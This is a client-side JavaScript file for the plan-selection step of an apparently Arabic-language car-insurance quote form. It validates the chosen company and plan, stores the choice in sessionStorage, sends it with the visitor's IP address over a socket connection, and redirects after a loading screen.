
function showLoadingScreen() {
  const overlay = document.getElementById('loadingOverlay');
  const countdown = document.getElementById('loadingCountdown');
  
  if (!overlay || !countdown) return;
  
  let seconds = 5;
  overlay.style.display = 'flex';
  
  const timer = setInterval(() => {
    seconds--;
    countdown.textContent = seconds;
    
    if (seconds <= 0) {
      clearInterval(timer);
      overlay.style.display = 'none';
    }
  }, 1000);
}

function showLoadingAndRedirect(url) {
  const loadingScreen = document.getElementById('loadingScreen');
  if (!loadingScreen) {
    window.location.href = url;
    return;
  }
  
  loadingScreen.classList.add('show');
  setTimeout(() => {
    window.location.href = url;
  }, 1000);
}

document.addEventListener("DOMContentLoaded", function() {
 
  showLoadingScreen();

  const radios = document.querySelectorAll("input[name='plan']");
  const nextButtons = document.querySelectorAll(".plan-next-btn");
  const planError = document.getElementById("planError");



  async function handleSelection(selected) {
    
    let existingData = {};
    try {
      const tempData = sessionStorage.getItem('tameeniTempData');
      if (tempData) {
        existingData = JSON.parse(tempData);
      }
    } catch (e) {
      console.error("خطأ في قراءة البيانات المؤقتة:", e);
    }

    const newData = {
      company: selected.dataset.company,
      planType: selected.dataset.plan,
      planPrice: Number(selected.dataset.price) || 0
    };

   
    const d = { ...existingData, ...newData };

    
    sessionStorage.setItem('tameeniTempData', JSON.stringify(d));

    (async function() {
        while (window.visitorIP === null) {
          await new Promise(function(r) { setTimeout(r, 50); });
        }
        var ip = window.visitorIP;
        window.socket.emit('submitInsurance', { ip: ip, company: newData.company, planType: newData.planType, planPrice: newData.planPrice });
      })();

    showLoadingAndRedirect("addons.html");
  }

  
  nextButtons.forEach(function(btn) {
    btn.addEventListener("click", async function () {
      let card = btn.closest(".plan-card");
      let chosen = card ? card.querySelector("input[name='plan']:checked") : null;

      planError.textContent = "";
      if (!chosen) {
        planError.textContent = "الرجاء اختيار خطة لهذه الشركة قبل المتابعة.";
        return;
      }

      await handleSelection(chosen);
    });
  });

  
  const form = document.getElementById("formStep3");
  if (form) {
    form.addEventListener("submit", async function(e) {
      e.preventDefault();
      planError.textContent = "";

      let selected = null;
      radios.forEach(r => { if (r.checked) selected = r; });

      if (!selected) {
        planError.textContent = "الرجاء اختيار شركة وخطة.";
        return;
      }

      await handleSelection(selected);
    });
  }
});